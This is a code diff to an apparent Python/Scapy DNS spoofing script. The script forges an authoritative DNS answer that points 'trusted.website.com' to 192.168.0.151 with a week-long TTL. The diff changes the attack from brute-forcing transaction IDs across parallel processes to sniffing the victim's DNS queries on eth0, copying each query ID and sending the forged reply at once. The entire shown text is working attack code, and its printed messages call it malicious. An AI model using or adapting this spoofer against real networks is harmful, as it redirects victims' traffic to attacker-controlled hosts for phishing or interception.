@@ -8,7 +8,7 @@ src_port=53
 dst_port=6666
 
 #precompute standard object
-response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=1, an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151")))
+response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname='trusted.website.com'), an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151")))
 dns_layer = response[DNS]
 
 #list of messages
@@ -28,5 +28,14 @@ def attack(start, end):
 
 if __name__ == "__main__":
 	mp.set_start_method('spawn')
-	for i in range(0,20,1):
-		mp.Process(target=attack, args=((i*500), (i+1)*500)).start()
+	print("[*] Program is sniffing packets from " + dst_ip + " to " + src_ip)
+	while 1:
+		sniffed_packet=sniff(iface="eth0", filter="src host " + dst_ip + " and dst host " + src_ip + " and dst port 53", count=1)
+		if sniffed_packet[0].haslayer(DNS):
+			print("[*] DNS Packet has been sniffed. Malicious packet will be forged and sent")
+			dns=sniffed_packet[0].getlayer(DNS)
+			dns_layer.id = dns.id
+			s.send(response)
+		
+			#for i in range(0,20,1):
+			#	mp.Process(target=attack, args=((i*500), (i+1)*500)).start()
